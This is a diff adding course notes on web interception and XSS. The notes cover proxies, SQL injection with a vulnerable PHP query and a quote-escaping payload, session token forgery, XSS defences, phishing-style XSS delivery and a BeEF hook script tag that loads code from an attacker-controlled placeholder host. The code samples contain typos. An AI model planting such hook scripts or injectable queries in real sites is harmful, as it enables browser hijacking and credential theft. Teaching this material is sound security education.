@@ -132,4 +132,197 @@ All modern runtime environments (PHP5, .NET, Java, Python, Ruby) were susceptibl
 
 
 
-# MODULE 0x0d LECTURE 0x310 - WEB HACKING
+# MODULE 0x0d LECTURE 0x330 - WEB INTERCEPTION
+
+## Figuring out about web servers with netcat
+
+* Just netcat the IP and pass in  to get the HTTP header
+    - `nc <HTTP server> 80`
+    - `GET / HTTP/1.0`
+    - A 'Host' header is required for HTTP 1.1, e.g.
+    - `Host: 192.168.1.191`
+
+
+### QUIZ ACCESS CODE
+
+Saint Agnes - Why do you Refuse to Die
+
+
+## Browsers and servers lie
+
+* The API messages sent between browsers and servers provide a wealth of information about the software that is running, properties of the endpoint computers, and user information
+    - All of these things can be false information.
+    - Browser user agent strings can be forged
+    - User information can be fake
+
+* Lying to browsers can be extremely helpful in testing security.
+    - If we can fool them into doing things they shouldn't, then so can anyone else.
+
+
+## Intercepting and modifying API messages
+
+You can intercept the message passed between a browser and a server in 2 ways:
+1. Using a proxy
+2. Using a browser tool
+
+* A _proxy_ is an appointed representative empowered to act on your behalf
+* A _web proxy_ is a program specifically designed to forward API messages to web servers on behalf of your browser and then return the server responses.
+
+## Why would I want a proxy
+
+* Store commonly referenced pages
+* Restrict web usage
+* Track web usage
+* etc.
+
+Burp suite good. OWASP ZAP also good
+
+
+## Web connection without proxy
+
+
+## Proxy required configuration
+
+
+## Browser interception tools
+
+* Mozilla web request
+    - Programmable API
+
+* Tamperchrome
+    - Provides a tool that augments browsing user interface
+
+
+## Hackable web applications
+
+* OWASP Juice Shop
+    - Alternatives at vulnerwablewebapps.org
+
+
+## Javascript validation bypass
+
+* Servers may try to enforce security by using Javascript client-side code to validate input
+    - This can be used, for example, to filter special characters (which might be interpreted incorrectly or might be used in a malicious exploit) out of password fields
+    - This is unsafe, of course, because browser is under user's control and makes the JS readily editable and stoppable.
+
+* Burp intruder is good for this
+
+
+## SQL injection
+
+Sample SQL code in PHP for user auth:
+```php
+$1QueryString =
+    "SELECT username FROM accounts WHEREusername ='".$pusername."' AND PASSWORD='".password."';";
+
+$1QueryResult = $this->mySQLHandler->executeQuery($1QueryString);
+```
+
+* What is the problem?
+    - escape the quotes of the source code, e.g. `USERNAME='jnw';--`
+
+
+## Avoiding SQL injection
+
+Alternatives exist (PHP Data Objects)
+```php
+$sth = $db->prepare("SELECT * FROM accounts WHERE username=?and password=?");
+
+$sth->execute([$pUsername $pPassword]);
+
+$results = $sth->fetchAll(PDO::FETCH_ASSCOC);
+```
+* In this case, the structure of the query is fixed and the values of the variable are conveyed to the database server separately -- not as characters of a long query string
+
+
+## Forging session tokens
+
+If multiple web pages must be visited in the context of a single session, the server must maintain some kind of session token in the user's browser.
+
+* If the security of the session information is weak, an attacker may be able to forge information from another user
+
+* Session tokens are often maintained in __cookies__ stored in browser
+    - Can be manipulated and stuff
+
+
+
+
+
+# MODULE 0x0d LECTURE 0x340 - XSS AND BROWSER EXPLOITATION
+
+## XSS: what is it, really?
+
+A: An injection problem in which an attacker injects a malicious script into a website
+
+1. Persistent
+ A script is stored in a persistent medium on a target server (usually a database) is inserted into a webpage by the server and then delivered to the user's web browser
+2. Reflected
+ A user is given a URL that includes a script (typically in a GET parameter) that will be inserted into a webpage __by the server__ and then reflected back to the user's browser
+3. DOM based
+ A user is given a URL of a __static__ page containing a parameter with a script in its value. If the parameter is used in Javascript code modifying the Document Objecct Model (DOM) including the parameter's value, then the __browser itself__ has inserted the script, not the server.
+
+
+## XSS is injection
+
+XSS causes __injection__ (insertion of unexpected, unforeseen input) of malicious code into a webpage.
+
+* The browser executes the malicious code.
+    - This requires us to be able to input something that sparks execution of code in the browser (usually Javascript code)
+
+
+## Ways to avoid XSS
+
+- __Validate__ the form of data on the server-side (not the client-side). Try to avoid putting it in a database if possible.
+
+- If you choose to _sanitize_ data, __denying__ dangerous characters is a poor method of addressing this. Instead, allow safe characters [A-Za-z0-9]
+    - Standards will chang (new tags, etc.)
+    - Database content can be directly modified to include malicious content
+    - Use trusted libraries, e.g. DOMPurify
+
+- __Allowing__ valid data to be used as input is a more reliable approach
+
+- Never insert untrusted data anywhere (if possible).
+
+- If you feel you must insert untrusted data, escape it appropriately.
+    - [OWASP XSS prevention cheat sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+
+- __Output encoding__
+
+- Use `HTTPOnly` cookies!
+    - These are inaccessible to Javsacript in all current browsers.
+    - The default is for cookies to be HTTP-accessible (insecure)
+
+- Use as restrictive a Content Security Policy (CSP) as possible.
+    - Default is no CSP, i.e. insecure
+
+- Understand your web dev framework and use it properly
+    - Default is that devs don't really know enough i.e. insecure
+
+
+## Delivering reflected XSS
+
+- Often delivered via phishing attacks
+- Often obfuscated URLs containing scripts may be transmitted via email
+- Link on a webpage may have an `onClick` method bound to a function that rewrites the link
+- A QR code may purport to go to a trustworthy website but through a route that inserts a script into POST or GET parameters
+
+
+## BeeF (Browser Exploitation Framework)
+
+Platform for generating and delivering payloads directly to the browser.
+
+Goes beyond typical XSS and provides robust platform for pentesting.
+
+* Modules supporting IPC (interprocess communication) and exploitation, history gathering, intelligence, network recon, host info gathering, browser plugin detection, etc.
+
+
+## BeEF Structure
+
+Beef console -> Beef server -> zombies (infected browsers)
+
+Simple hook script is:
+`<script src="http://your-ip:3000/hook.js"type="text/javascript"></script>`
+
+Once a browser is hooked, it connects back to the Beef server
+
+END  MODULE 0x0d
